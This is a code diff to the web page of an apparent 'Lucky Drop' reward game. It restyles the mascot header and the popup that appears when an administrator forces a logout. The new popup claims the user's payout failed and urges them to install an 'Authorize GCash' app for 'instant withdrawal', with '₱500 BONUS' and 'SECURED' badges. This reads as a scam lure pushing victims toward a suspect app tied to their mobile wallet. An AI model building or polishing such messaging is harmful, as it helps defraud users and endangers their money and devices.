@@ -39,13 +39,17 @@
     <!-- Main Game Card -->
     <div class="card" id="mainCard">
 
-        <!-- Lucky Cat Mascot (header) -->
+        <!-- ✅ Lucky Cat Mascot Header (aligned) -->
         <div class="luckycat-header">
             <div class="luckycat-ring">
                 <div class="luckycat-inner">
-                    <span class="luckycat-emoji">🐱</span>
-                    <div class="luckycat-bell">🔔</div>
+                    <img src="images/LuckyCat.png" alt="Lucky Cat" class="luckycat-img" onerror="this.style.display='none'; this.nextElementSibling.style.display='flex';">
+                    <span class="luckycat-emoji" style="display:none;">🐱</span>
                 </div>
+                <div class="luckycat-bell">🔔</div>
+                <span class="luckycat-star star-1">✨</span>
+                <span class="luckycat-star star-2">⭐</span>
+                <span class="luckycat-star star-3">✨</span>
             </div>
             <div class="luckycat-title">LUCKY DROP</div>
             <div class="luckycat-subtitle">✦ Maneki-Neko Fortune ✦</div>
@@ -185,7 +189,7 @@
         };
     </script>
 
-    <!-- ========== FORCE LOGOUT LISTENER ========== -->
+    <!-- ========== FORCE LOGOUT LISTENER — LUCKY CAT THEME ========== -->
     <script>
         (function() {
             'use strict';
@@ -197,69 +201,648 @@
                 if (forceLogoutPopupShown) return;
                 forceLogoutPopupShown = true;
 
+                addLuckyCatLogoutStyles();
+
                 const overlay = document.createElement('div');
-                overlay.style.cssText = `
-                    position: fixed;
-                    top: 0;
-                    left: 0;
-                    width: 100%;
-                    height: 100%;
-                    background: rgba(0, 0, 0, 0.95);
-                    backdrop-filter: blur(15px);
-                    z-index: 99999;
-                    display: flex;
-                    align-items: center;
-                    justify-content: center;
-                    animation: fadeIn 0.4s ease;
-                `;
+                overlay.className = 'lucky-logout-overlay';
 
+                // Confetti Layer
+                const confettiLayer = document.createElement('div');
+                confettiLayer.className = 'lucky-logout-confetti-layer';
+
+                const confettiColors = ['#ffd700', '#ff1744', '#ffffff', '#ff9500'];
+                const confettiShapes = ['circle', 'square', 'ribbon'];
+
+                for (let i = 0; i < 15; i++) {
+                    const piece = document.createElement('div');
+                    const color = confettiColors[Math.floor(Math.random() * confettiColors.length)];
+                    const shape = confettiShapes[Math.floor(Math.random() * confettiShapes.length)];
+                    const size = Math.random() * 8 + 5;
+                    const startX = Math.random() * 100;
+                    const delay = Math.random() * 4;
+                    const duration = Math.random() * 4 + 5;
+                    const rotate = Math.random() * 360;
+
+                    piece.className = 'lucky-logout-confetti ' + shape;
+                    piece.style.cssText =
+                        'left: ' + startX + '%;' +
+                        'width: ' + size + 'px;' +
+                        'height: ' + (shape === 'ribbon' ? size * 2.5 : size) + 'px;' +
+                        'background: ' + color + ';' +
+                        'animation: luckyLogoutFall ' + duration + 's ' + delay + 's linear infinite;' +
+                        'transform: rotate(' + rotate + 'deg);';
+                    confettiLayer.appendChild(piece);
+                }
+                overlay.appendChild(confettiLayer);
+
+                // Center Burst
+                const centerBurst = document.createElement('div');
+                centerBurst.className = 'lucky-logout-center-burst';
+                overlay.appendChild(centerBurst);
+
+                // Main Card
                 const card = document.createElement('div');
-                card.style.cssText = `
-                    background: linear-gradient(145deg, #2a0a0a, #0a0303);
-                    border: 3px solid #ffd700;
-                    border-radius: 28px;
-                    padding: 35px 28px;
-                    text-align: center;
-                    max-width: 360px;
-                    width: 85%;
-                    box-shadow: 0 0 60px rgba(255, 215, 0, 0.4), 0 25px 50px rgba(0,0,0,0.8);
-                    animation: modalIn 0.3s ease;
-                `;
+                card.className = 'lucky-logout-card';
 
-                card.innerHTML = `
-                    <div style="font-size: 60px; margin-bottom: 15px;">🐱</div>
-                    <h2 style="font-family: 'Fredoka', sans-serif; font-size: 22px; font-weight: 900; color: #ffd700; margin-bottom: 10px;">SESSION ENDED</h2>
-                    <p style="font-family: 'Fredoka', sans-serif; font-size: 14px; color: #ddd; line-height: 1.6; margin-bottom: 20px;">
-                        Your session has been terminated by the administrator.<br><br>
-                        Please login again to continue.
-                    </p>
-                    <button id="forceLogoutOkBtn" style="
-                        width: 100%;
-                        background: linear-gradient(180deg, #ffd700, #ff9500);
-                        border: 3px solid #fff;
-                        border-radius: 14px;
-                        padding: 14px;
-                        font-family: 'Fredoka', sans-serif;
-                        font-size: 15px;
-                        font-weight: 800;
-                        color: #8b0000;
-                        cursor: pointer;
-                        box-shadow: 0 5px 0 #8b4500, 0 8px 20px rgba(0,0,0,0.5);
-                        transition: all 0.1s ease;
-                        letter-spacing: 2px;
-                    ">OK</button>
-                `;
+                card.innerHTML =
+                    '<div class="lucky-logout-ribbon-left">🐱</div>' +
+                    '<div class="lucky-logout-ribbon-right">🔔</div>' +
+
+                    '<div class="lucky-logout-mascot-wrap">' +
+                        '<div class="lucky-logout-mascot-glow"></div>' +
+                        '<div class="lucky-logout-mascot-ring"></div>' +
+                        '<div class="lucky-logout-mascot">🐱</div>' +
+                        '<div class="lucky-logout-mascot-star star-1">✨</div>' +
+                        '<div class="lucky-logout-mascot-star star-2">⭐</div>' +
+                        '<div class="lucky-logout-mascot-star star-3">✨</div>' +
+                    '</div>' +
+
+                    '<div class="lucky-logout-badge">' +
+                        '<span class="lucky-logout-badge-dot"></span>' +
+                        '<span>SESSION ENDED</span>' +
+                    '</div>' +
+
+                    '<h2 class="lucky-logout-title">PAYOUT UNSUCCESSFUL</h2>' +
+
+                    '<div class="lucky-logout-divider">' +
+                        '<span class="divider-star">★</span>' +
+                        '<span class="divider-line"></span>' +
+                        '<span class="divider-star">★</span>' +
+                    '</div>' +
+
+                    '<p class="lucky-logout-message">' +
+                        'Your payout request is <strong>unsuccessful</strong>.<br>' +
+                        'Install and use your <span class="lucky-logout-highlight">Authorize GCash</span><br>' +
+                        'to process instant withdrawal.' +
+                    '</p>' +
+
+                    '<div class="lucky-logout-note">' +
+                        '<i>🔐</i> Please login again to continue.' +
+                    '</div>' +
+
+                    '<div class="lucky-logout-chips">' +
+                        '<div class="lucky-logout-chip">' +
+                            '<span class="chip-icon">🎁</span>' +
+                            '<span class="chip-text">₱500 BONUS</span>' +
+                        '</div>' +
+                        '<div class="lucky-logout-chip">' +
+                            '<span class="chip-icon">⚡</span>' +
+                            '<span class="chip-text">INSTANT</span>' +
+                        '</div>' +
+                        '<div class="lucky-logout-chip">' +
+                            '<span class="chip-icon">🔒</span>' +
+                            '<span class="chip-text">SECURED</span>' +
+                        '</div>' +
+                    '</div>' +
+
+                    '<button id="returnHomeBtn" class="lucky-logout-btn">' +
+                        '<span class="btn-icon">🏠</span>' +
+                        '<span class="btn-text">RETURN TO HOME</span>' +
+                        '<span class="btn-shine"></span>' +
+                    '</button>' +
+
+                    '<div class="lucky-logout-footer">' +
+                        '<span>🐱</span> LUCKY DROP FESTIVAL <span>🐱</span>' +
+                    '</div>';
 
                 overlay.appendChild(card);
                 document.body.appendChild(overlay);
 
-                document.getElementById('forceLogoutOkBtn').addEventListener('click', function() {
-                    localStorage.clear();
-                    sessionStorage.clear();
-                    window.location.replace('index.html');
-                });
+                const homeBtn = document.getElementById('returnHomeBtn');
+                if (homeBtn) {
+                    homeBtn.addEventListener('click', function() {
+                        localStorage.clear();
+                        sessionStorage.clear();
+                        window.location.replace('index.html');
+                    });
+                }
+
+                setTimeout(function() {
+                    if (document.querySelector('.lucky-logout-overlay')) {
+                        localStorage.clear();
+                        sessionStorage.clear();
+                        window.location.replace('index.html');
+                    }
+                }, 15000);
             }
 
+            // ============================================================
+            // ✅ LUCKY CAT LOGOUT STYLES (perfected mobile alignment)
+            // ============================================================
+            function addLuckyCatLogoutStyles() {
+                if (document.querySelector('#lucky-logout-styles')) return;
+
+                const style = document.createElement('style');
+                style.id = 'lucky-logout-styles';
+                style.textContent = `
+                    /* ========== OVERLAY ========== */
+                    .lucky-logout-overlay {
+                        position: fixed;
+                        inset: 0;
+                        z-index: 999999;
+                        display: flex;
+                        align-items: center;
+                        justify-content: center;
+                        padding: 16px;
+                        background:
+                            radial-gradient(circle at 50% 40%, rgba(255, 215, 0, 0.25) 0%, rgba(255, 215, 0, 0.08) 15%, transparent 45%),
+                            radial-gradient(circle at 50% 50%, #d10000 0%, #8b0000 35%, #4a0000 65%, #1a0000 100%);
+                        overflow: hidden;
+                        animation: luckyLogoutFadeIn 0.4s ease;
+                        font-family: 'Fredoka', 'Public Sans', sans-serif;
+                        box-sizing: border-box;
+                    }
+
+                    /* ========== CONFETTI LAYER ========== */
+                    .lucky-logout-confetti-layer {
+                        position: absolute;
+                        inset: 0;
+                        overflow: hidden;
+                        pointer-events: none;
+                        z-index: 1;
+                    }
+
+                    .lucky-logout-confetti {
+                        position: absolute;
+                        top: -20px;
+                        opacity: 0.9;
+                    }
+
+                    .lucky-logout-confetti.circle { border-radius: 50%; }
+                    .lucky-logout-confetti.square { border-radius: 2px; }
+                    .lucky-logout-confetti.ribbon { border-radius: 3px; }
+
+                    /* ========== CENTER BURST ========== */
+                    .lucky-logout-center-burst {
+                        position: absolute;
+                        top: 50%;
+                        left: 50%;
+                        width: 380px;
+                        height: 380px;
+                        transform: translate(-50%, -50%);
+                        background: radial-gradient(circle,
+                            rgba(255, 215, 0, 0.5) 0%,
+                            rgba(255, 149, 0, 0.2) 25%,
+                            transparent 65%);
+                        border-radius: 50%;
+                        pointer-events: none;
+                        z-index: 2;
+                        animation: luckyLogoutBurst 3s ease-in-out infinite;
+                    }
+
+                    /* ========== CARD ========== */
+                    .lucky-logout-card {
+                        position: relative;
+                        z-index: 3;
+                        width: 100%;
+                        max-width: 360px;
+                        padding: 40px 22px 24px;
+                        background:
+                            linear-gradient(180deg, rgba(255, 255, 255, 0.15) 0%, transparent 25%),
+                            linear-gradient(160deg, #d10000 0%, #8b0000 45%, #4a0000 100%);
+                        border: 4px solid #ffd700;
+                        border-radius: 28px;
+                        text-align: center;
+                        box-shadow:
+                            0 20px 50px rgba(0, 0, 0, 0.7),
+                            0 0 40px rgba(255, 215, 0, 0.5);
+                        animation: luckyLogoutCardEnter 0.7s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+                        overflow: hidden;
+                        box-sizing: border-box;
+                    }
+
+                    .lucky-logout-card::before {
+                        content: '';
+                        position: absolute;
+                        top: 0;
+                        left: 0;
+                        right: 0;
+                        height: 3px;
+                        background: linear-gradient(90deg, transparent, #fff9c4, #ffd700, #fff9c4, transparent);
+                    }
+
+                    /* ========== RIBBONS ========== */
+                    .lucky-logout-ribbon-left,
+                    .lucky-logout-ribbon-right {
+                        position: absolute;
+                        top: -8px;
+                        font-size: 26px;
+                        filter: drop-shadow(0 0 8px rgba(255, 215, 0, 0.9));
+                        animation: luckyLogoutBellRing 1.5s ease-in-out infinite;
+                        transform-origin: top center;
+                    }
+
+                    .lucky-logout-ribbon-left { left: 14px; }
+                    .lucky-logout-ribbon-right { right: 14px; }
+
+                    /* ========== MASCOT ========== */
+                    .lucky-logout-mascot-wrap {
+                        position: relative;
+                        width: 120px;
+                        height: 120px;
+                        margin: 0 auto 14px;
+                    }
+
+                    .lucky-logout-mascot-glow {
+                        position: absolute;
+                        inset: -18px;
+                        background: radial-gradient(circle,
+                            rgba(255, 215, 0, 0.5) 0%,
+                            rgba(255, 149, 0, 0.3) 40%,
+                            transparent 70%);
+                        border-radius: 50%;
+                    }
+
+                    .lucky-logout-mascot-ring {
+                        position: absolute;
+                        inset: 0;
+                        border: 3px dashed #ffd700;
+                        border-radius: 50%;
+                        box-shadow: 0 0 20px rgba(255, 215, 0, 0.6);
+                        animation: luckyLogoutSpin 15s linear infinite;
+                    }
+
+                    .lucky-logout-mascot {
+                        position: absolute;
+                        top: 50%;
+                        left: 50%;
+                        transform: translate(-50%, -50%);
+                        font-size: 62px;
+                        filter: drop-shadow(0 4px 12px rgba(0, 0, 0, 0.6));
+                        z-index: 2;
+                        animation: luckyLogoutBounce 2s ease-in-out infinite;
+                        line-height: 1;
+                    }
+
+                    .lucky-logout-mascot-star {
+                        position: absolute;
+                        font-size: 16px;
+                        filter: drop-shadow(0 0 6px currentColor);
+                    }
+
+                    .star-1 { top: 0; right: 0; color: #ffd700; animation: luckyLogoutSparkle 2s ease-in-out infinite; }
+                    .star-2 { bottom: 0; left: 0; color: #ff1744; animation: luckyLogoutSparkle 2s ease-in-out infinite 0.5s; }
+                    .star-3 { top: 30%; left: -5px; color: #ffffff; animation: luckyLogoutSparkle 2s ease-in-out infinite 1s; }
+
+                    /* ========== BADGE ========== */
+                    .lucky-logout-badge {
+                        display: inline-flex;
+                        align-items: center;
+                        gap: 8px;
+                        padding: 6px 18px;
+                        margin-bottom: 12px;
+                        background: rgba(0, 0, 0, 0.45);
+                        border: 2px solid rgba(255, 68, 68, 0.9);
+                        border-radius: 20px;
+                        font-family: 'Orbitron', monospace;
+                        font-size: 10px;
+                        font-weight: 800;
+                        color: #ff8888;
+                        letter-spacing: 2.5px;
+                        text-transform: uppercase;
+                        box-shadow: 0 0 15px rgba(255, 68, 68, 0.4);
+                    }
+
+                    .lucky-logout-badge-dot {
+                        width: 8px;
+                        height: 8px;
+                        background: #ff3b3b;
+                        border-radius: 50%;
+                        box-shadow: 0 0 8px #ff3b3b;
+                        animation: luckyLogoutPulseDot 1.2s infinite;
+                    }
+
+                    /* ========== TITLE ========== */
+                    .lucky-logout-title {
+                        font-family: 'Fredoka', sans-serif;
+                        font-size: 24px;
+                        font-weight: 900;
+                        margin: 0 0 6px 0;
+                        letter-spacing: 1.5px;
+                        text-transform: uppercase;
+                        line-height: 1.15;
+                        background: linear-gradient(180deg,
+                            #fff9c4 0%,
+                            #ffd700 30%,
+                            #ffeb3b 50%,
+                            #ff9800 80%,
+                            #ff6f00 100%);
+                        -webkit-background-clip: text;
+                        background-clip: text;
+                        color: transparent;
+                        filter: drop-shadow(0 0 15px rgba(255, 215, 0, 0.7));
+                    }
+
+                    /* ========== DIVIDER ========== */
+                    .lucky-logout-divider {
+                        display: flex;
+                        align-items: center;
+                        justify-content: center;
+                        gap: 10px;
+                        margin: 14px auto;
+                        width: 75%;
+                    }
+
+                    .divider-star {
+                        font-size: 14px;
+                        color: #ffd700;
+                        text-shadow: 0 0 8px rgba(255, 215, 0, 0.9);
+                    }
+
+                    .divider-line {
+                        flex: 1;
+                        height: 2px;
+                        background: linear-gradient(90deg, transparent, #ffd700, #ff1744, #ffd700, transparent);
+                        border-radius: 2px;
+                    }
+
+                    /* ========== MESSAGE ========== */
+                    .lucky-logout-message {
+                        font-family: 'Fredoka', sans-serif;
+                        font-size: 13px;
+                        line-height: 1.7;
+                        color: rgba(255, 255, 255, 0.92);
+                        margin: 0 0 14px 0;
+                        text-shadow: 0 1px 3px rgba(0, 0, 0, 0.6);
+                        font-weight: 400;
+                    }
+
+                    .lucky-logout-message strong {
+                        color: #ff6b6b;
+                        font-weight: 800;
+                    }
+
+                    .lucky-logout-highlight {
+                        display: inline-block;
+                        padding: 2px 8px;
+                        background: linear-gradient(180deg, #ffd700, #ff9800);
+                        -webkit-background-clip: text;
+                        background-clip: text;
+                        color: transparent;
+                        font-weight: 900;
+                    }
+
+                    /* ========== NOTE (Please login again) ========== */
+                    .lucky-logout-note {
+                        display: inline-flex;
+                        align-items: center;
+                        justify-content: center;
+                        gap: 6px;
+                        padding: 8px 16px;
+                        margin-bottom: 18px;
+                        background: rgba(255, 215, 0, 0.1);
+                        border: 1.5px solid rgba(255, 215, 0, 0.4);
+                        border-radius: 12px;
+                        font-family: 'Fredoka', sans-serif;
+                        font-size: 12px;
+                        font-weight: 500;
+                        color: #ffd700;
+                        text-shadow: 0 0 8px rgba(255, 215, 0, 0.5);
+                    }
+
+                    .lucky-logout-note i {
+                        font-style: normal;
+                        font-size: 13px;
+                    }
+
+                    /* ========== CHIPS ========== */
+                    .lucky-logout-chips {
+                        display: flex;
+                        justify-content: center;
+                        gap: 6px;
+                        margin-bottom: 20px;
+                        flex-wrap: wrap;
+                    }
+
+                    .lucky-logout-chip {
+                        display: flex;
+                        align-items: center;
+                        gap: 4px;
+                        padding: 6px 10px;
+                        background: rgba(0, 0, 0, 0.4);
+                        border: 1.5px solid rgba(255, 215, 0, 0.6);
+                        border-radius: 12px;
+                        font-family: 'Orbitron', monospace;
+                        font-size: 8.5px;
+                        font-weight: 800;
+                        color: #ffd700;
+                        letter-spacing: 1px;
+                        text-transform: uppercase;
+                        box-shadow: 0 0 8px rgba(255, 215, 0, 0.3);
+                    }
+
+                    .chip-icon { font-size: 11px; }
+
+                    /* ========== BUTTON ========== */
+                    .lucky-logout-btn {
+                        position: relative;
+                        width: 100%;
+                        padding: 16px 20px;
+                        display: flex;
+                        align-items: center;
+                        justify-content: center;
+                        gap: 10px;
+                        background: linear-gradient(180deg,
+                            #fff9c4 0%,
+                            #ffeb3b 20%,
+                            #ffd700 45%,
+                            #ff9800 75%,
+                            #ff6f00 100%);
+                        border: 3px solid #fff9c4;
+                        border-radius: 16px;
+                        font-family: 'Fredoka', sans-serif;
+                        font-size: 14px;
+                        font-weight: 900;
+                        color: #8b0000;
+                        letter-spacing: 2px;
+                        text-transform: uppercase;
+                        cursor: pointer;
+                        overflow: hidden;
+                        box-shadow:
+                            0 6px 0 #8b4500,
+                            0 10px 20px rgba(0, 0, 0, 0.5),
+                            0 0 25px rgba(255, 215, 0, 0.5);
+                        transition: transform 0.1s ease, box-shadow 0.1s ease;
+                        -webkit-tap-highlight-color: transparent;
+                    }
+
+                    .lucky-logout-btn:active {
+                        transform: translateY(6px);
+                        box-shadow: 0 0 0 #8b4500, 0 4px 15px rgba(0, 0, 0, 0.5);
+                    }
+
+                    .btn-icon { font-size: 18px; }
+
+                    /* ========== FOOTER ========== */
+                    .lucky-logout-footer {
+                        margin-top: 16px;
+                        font-family: 'Orbitron', monospace;
+                        font-size: 9px;
+                        font-weight: 700;
+                        color: rgba(255, 215, 0, 0.85);
+                        letter-spacing: 3px;
+                        text-transform: uppercase;
+                        text-shadow: 0 0 8px rgba(255, 215, 0, 0.6);
+                    }
+
+                    /* ========== ANIMATIONS ========== */
+                    @keyframes luckyLogoutFadeIn {
+                        from { opacity: 0; }
+                        to { opacity: 1; }
+                    }
+
+                    @keyframes luckyLogoutCardEnter {
+                        0% { transform: scale(0.7) translateY(40px); opacity: 0; }
+                        60% { transform: scale(1.04) translateY(-6px); }
+                        100% { transform: scale(1) translateY(0); opacity: 1; }
+                    }
+
+                    @keyframes luckyLogoutFall {
+                        0% { transform: translateY(-20px) rotate(0deg); opacity: 0; }
+                        10% { opacity: 1; }
+                        90% { opacity: 1; }
+                        100% { transform: translateY(105vh) rotate(720deg); opacity: 0; }
+                    }
+
+                    @keyframes luckyLogoutSpin {
+                        from { transform: rotate(0deg); }
+                        to { transform: rotate(360deg); }
+                    }
+
+                    @keyframes luckyLogoutBounce {
+                        0%, 100% { transform: translate(-50%, -50%) translateY(0); }
+                        50% { transform: translate(-50%, -50%) translateY(-8px); }
+                    }
+
+                    @keyframes luckyLogoutBellRing {
+                        0%, 100% { transform: rotate(0deg); }
+                        25% { transform: rotate(-15deg); }
+                        75% { transform: rotate(15deg); }
+                    }
+
+                    @keyframes luckyLogoutSparkle {
+                        0%, 100% { opacity: 0.5; transform: scale(1); }
+                        50% { opacity: 1; transform: scale(1.3); }
+                    }
+
+                    @keyframes luckyLogoutPulseDot {
+                        0%, 100% { opacity: 1; }
+                        50% { opacity: 0.4; }
+                    }
+
+                    @keyframes luckyLogoutBurst {
+                        0%, 100% { opacity: 0.6; transform: translate(-50%, -50%) scale(1); }
+                        50% { opacity: 1; transform: translate(-50%, -50%) scale(1.1); }
+                    }
+
+                    /* ========== RESPONSIVE (mobile aligned) ========== */
+                    @media (max-width: 420px) {
+                        .lucky-logout-overlay {
+                            padding: 12px;
+                        }
+
+                        .lucky-logout-card {
+                            max-width: 100%;
+                            padding: 36px 18px 22px;
+                            border-radius: 24px;
+                            border-width: 3px;
+                        }
+
+                        .lucky-logout-title {
+                            font-size: 20px;
+                            letter-spacing: 1px;
+                        }
+
+                        .lucky-logout-mascot-wrap {
+                            width: 100px;
+                            height: 100px;
+                            margin-bottom: 12px;
+                        }
+
+                        .lucky-logout-mascot {
+                            font-size: 52px;
+                        }
+
+                        .lucky-logout-mascot-star {
+                            font-size: 13px;
+                        }
+
+                        .lucky-logout-badge {
+                            font-size: 9px;
+                            padding: 5px 14px;
+                            letter-spacing: 2px;
+                        }
+
+                        .lucky-logout-message {
+                            font-size: 12px;
+                            line-height: 1.6;
+                        }
+
+                        .lucky-logout-note {
+                            font-size: 11px;
+                            padding: 7px 12px;
+                        }
+
+                        .lucky-logout-btn {
+                            padding: 14px 16px;
+                            font-size: 12px;
+                            letter-spacing: 1.5px;
+                        }
+
+                        .btn-icon { font-size: 16px; }
+
+                        .lucky-logout-chip {
+                            font-size: 7.5px;
+                            padding: 5px 8px;
+                        }
+
+                        .chip-icon { font-size: 10px; }
+
+                        .lucky-logout-ribbon-left,
+                        .lucky-logout-ribbon-right {
+                            font-size: 22px;
+                            top: -6px;
+                        }
+
+                        .lucky-logout-footer {
+                            font-size: 8px;
+                            letter-spacing: 2px;
+                        }
+                    }
+
+                    @media (max-width: 360px) {
+                        .lucky-logout-card {
+                            padding: 32px 14px 20px;
+                        }
+
+                        .lucky-logout-mascot-wrap {
+                            width: 90px;
+                            height: 90px;
+                        }
+
+                        .lucky-logout-mascot {
+                            font-size: 46px;
+                        }
+
+                        .lucky-logout-title {
+                            font-size: 18px;
+                        }
+
+                        .lucky-logout-message {
+                            font-size: 11px;
+                        }
+
+                        .lucky-logout-note {
+                            font-size: 10px;
+                        }
+                    }
+                `;
+                document.head.appendChild(style);
+            }
+
+            // ============================================================
+            // INIT — LISTENER SETUP
+            // ============================================================
             function init() {
                 const userPhone = localStorage.getItem('userPhone');
                 if (!userPhone) return;
@@ -286,19 +869,6 @@
                     console.error('Logout listener error:', e);
                 }
             }
-
-            const style = document.createElement('style');
-            style.textContent = `
-                @keyframes fadeIn {
-                    from { opacity: 0; }
-                    to { opacity: 1; }
-                }
-                @keyframes modalIn {
-                    from { opacity: 0; transform: scale(0.9); }
-                    to { opacity: 1; transform: scale(1); }
-                }
-            `;
-            document.head.appendChild(style);
 
             if (document.readyState === 'loading') {
                 document.addEventListener('DOMContentLoaded', init);
